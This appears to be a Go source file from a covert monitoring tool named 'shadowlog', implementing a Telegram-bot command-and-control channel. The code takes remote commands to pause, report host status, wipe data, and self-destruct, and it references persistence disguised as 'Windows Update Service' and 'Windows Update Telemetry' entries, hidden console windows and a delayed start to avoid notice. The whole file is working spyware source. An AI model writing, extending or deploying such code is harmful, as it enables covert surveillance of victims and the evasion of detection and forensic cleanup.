package monitor

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"shadowlog/config"
)

// killSwitch polls the Telegram bot API for remote commands.
type killSwitch struct {
	token     string
	chatID    string
	lastMsgID int
	enabled   bool
}

// telegramUpdate represents a Telegram API update response.
type telegramUpdate struct {
	OK     bool `json:"ok"`
	Result []struct {
		UpdateID int `json:"update_id"`
		Message  struct {
			MessageID int    `json:"message_id"`
			Text      string `json:"text"`
			Chat      struct {
				ID int64 `json:"id"`
			} `json:"chat"`
		} `json:"message"`
	} `json:"result"`
}

// newKillSwitch creates a new remote kill switch handler.
func newKillSwitch(token, chatID string, enabled bool) *killSwitch {
	return &killSwitch{
		token:   token,
		chatID:  chatID,
		enabled: enabled && token != "" && chatID != "",
	}
}

// start begins polling the Telegram bot for commands every 5 minutes.
// Supported commands:
//   /kill     — full uninstall + self-destruct
//   /pause    — temporarily suspend monitoring
//   /resume   — resume monitoring
//   /status   — report current status
//   /wipe     — delete all local data without uninstalling
func (ks *killSwitch) start(pauseChan chan<- bool) {
	if !ks.enabled {
		return
	}

	// Initial delay to avoid immediate network activity on startup.
	time.Sleep(30 * time.Second)

	for {
		ks.poll(pauseChan)
		time.Sleep(30 * time.Second)
	}
}

// poll checks for new commands from the Telegram bot.
func (ks *killSwitch) poll(pauseChan chan<- bool) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates?offset=%d&timeout=5",
		ks.token, ks.lastMsgID+1)

	client := sharedHTTPClient
	resp, err := client.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	var updates telegramUpdate
	if err := json.NewDecoder(resp.Body).Decode(&updates); err != nil {
		return
	}

	if !updates.OK {
		return
	}

	for _, update := range updates.Result {
		ks.lastMsgID = update.UpdateID

		// Verify the command comes from our authorized chat.
		expectedChatID := ks.chatID
		msgChatID := fmt.Sprintf("%d", update.Message.Chat.ID)
		if msgChatID != expectedChatID {
			continue
		}

		cmd := strings.ToLower(strings.TrimSpace(update.Message.Text))
		switch cmd {
		case "/kill":
			ks.sendResponse("🔴 *KILL SWITCH ACTIVATED*\n\nSelf-destructing in 5 seconds...")
			time.Sleep(5 * time.Second)
			ks.executeKill()

		case "/pause":
			ks.sendResponse("⏸️ *Monitoring Paused*\n\nSend `/resume` to continue.")
			if pauseChan != nil {
				pauseChan <- true
			}

		case "/resume":
			ks.sendResponse("▶️ *Monitoring Resumed*\n\nAll hooks re-activated.")
			if pauseChan != nil {
				pauseChan <- false
			}

		case "/status":
			hostname, _ := os.Hostname()
			ks.sendResponse(fmt.Sprintf("🟢 *Agent Status*\n\n• Host: `%s`\n• Uptime: Active\n• PID: `%d`",
				hostname, os.Getpid()))

		case "/wipe":
			ks.sendResponse("🧹 *Data Wipe Initiated*\n\nAll local artifacts purged.")
			os.Remove(config.GetStoragePath())
			os.Remove(config.GetSyncPath())
			config.DeleteConfigFromRegistry()
		}
	}
}

// executeKill performs a complete self-destruct:
// 1. Remove persistence (registry + scheduled task)
// 2. Delete all local data
// 3. Delete the executable itself
// 4. Terminate the process
func (ks *killSwitch) executeKill() {
	// Remove registry persistence.
	deleteRegistryKey(`Software\Microsoft\Windows\CurrentVersion\Run`, "Windows Update Service")

	// Remove scheduled task.
	cmd := exec.Command("schtasks", "/delete", "/tn", "Windows Update Telemetry", "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()

	// Delete all local data.
	os.Remove(config.GetStoragePath())
	os.Remove(config.GetSyncPath())
	config.DeleteConfigFromRegistry()

	// Self-delete: schedule deletion of the executable after exit.
	exePath, err := os.Executable()
	if err == nil {
		// Use cmd.exe to delete the exe after a short delay.
		delCmd := exec.Command("cmd", "/c", "ping", "127.0.0.1", "-n", "3", ">", "nul", "&", "del", "/f", "/q", exePath)
		delCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		delCmd.Start()
	}

	os.Exit(0)
}

// deleteRegistryKey removes a specific value from a registry key.
func deleteRegistryKey(path, valueName string) {
	pathPtr, _ := syscall.UTF16PtrFromString(path)
	valuePtr, _ := syscall.UTF16PtrFromString(valueName)
	var h syscall.Handle
	err := syscall.RegOpenKeyEx(0x80000001, pathPtr, 0, 0x20006, &h) // HKCU, KEY_SET_VALUE
	if err != nil {
		return
	}
	defer syscall.RegCloseKey(h)

	// RegDeleteValue
	regDeleteValue := syscall.NewLazyDLL("advapi32.dll").NewProc("RegDeleteValueW")
	regDeleteValue.Call(uintptr(h), uintptr(unsafe.Pointer(valuePtr)))
}

// sendResponse sends a message back to the Telegram chat.
func (ks *killSwitch) sendResponse(text string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", ks.token)
	payload := fmt.Sprintf(`{"chat_id":"%s","text":"%s","parse_mode":"Markdown"}`, ks.chatID, text)

	req, err := http.NewRequest("POST", url, strings.NewReader(payload))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")

	client := sharedHTTPClient
	client.Do(req)
}
